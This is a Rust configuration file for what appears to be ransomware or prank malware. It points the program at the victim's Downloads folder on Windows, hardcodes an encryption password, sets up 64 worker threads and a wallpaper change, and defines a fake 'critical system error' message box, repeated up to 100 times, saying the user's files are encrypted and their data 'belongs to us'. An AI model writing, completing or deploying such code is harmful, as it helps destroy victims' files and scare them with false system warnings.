use std::path::PathBuf;

/// Target directory to process files from
/// On Windows: uses Documents folder if this is empty
/// On Linux: uses /tmp/target if this is empty
pub const TARGET_DIR: &str = "";

/// Pre-known password for encryption
pub const PASSWORD: &str = "MySecretPassword123!";

/// Number of worker threads for parallel processing
pub const THREAD_COUNT: usize = 64;

/// Whether to show CLI debug output
pub const SHOW_CLI: bool = false;

/// Whether to show GUI message boxes
pub const SHOW_MESSAGEBOXES: bool = true;

/// How many times to show the message box (set to 0 for infinite loop, requires Ctrl+C to stop)
pub const MESSAGEBOX_LOOP_COUNT: usize = 100;

/// Delay between message boxes in milliseconds
pub const MESSAGEBOX_DELAY_MS: u64 = 500;

/// Whether to set wallpaper after encryption
pub const SET_WALLPAPER: bool = true;

/// Message box title (Windows only)
#[cfg(target_os = "windows")]
pub const MESSAGEBOX_TITLE: &str = "⚠ CRITICAL SYSTEM ERROR ⚠";

/// Message box text (Windows only)
#[cfg(target_os = "windows")]
pub const MESSAGEBOX_TEXT: &str = 
    "ERROR 0x8007045D: CATASTROPHIC DATA CORRUPTION DETECTED\n\n\
    Your files have been encrypted with military-grade cryptography.\n\n\
    All your data belongs to us now! 😈\n\n\
    Just kidding... or are we? 🤔";

/// Get the target directory, using platform-specific defaults if TARGET_DIR is empty
pub fn get_target_dir() -> PathBuf {
    if !TARGET_DIR.is_empty() {
        return PathBuf::from(TARGET_DIR);
    }

    // Platform-specific defaults
    #[cfg(target_os = "windows")]
    {
        // Use Documents folder on Windows
        // if let Some(user_dirs) = dirs_next::document_dir() {
        if let Some(user_dirs) = dirs_next::download_dir() {
            user_dirs
        } else {
            PathBuf::from(".")
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Use /tmp/target on Linux/Unix
        PathBuf::from("/tmp/target")
    }
}
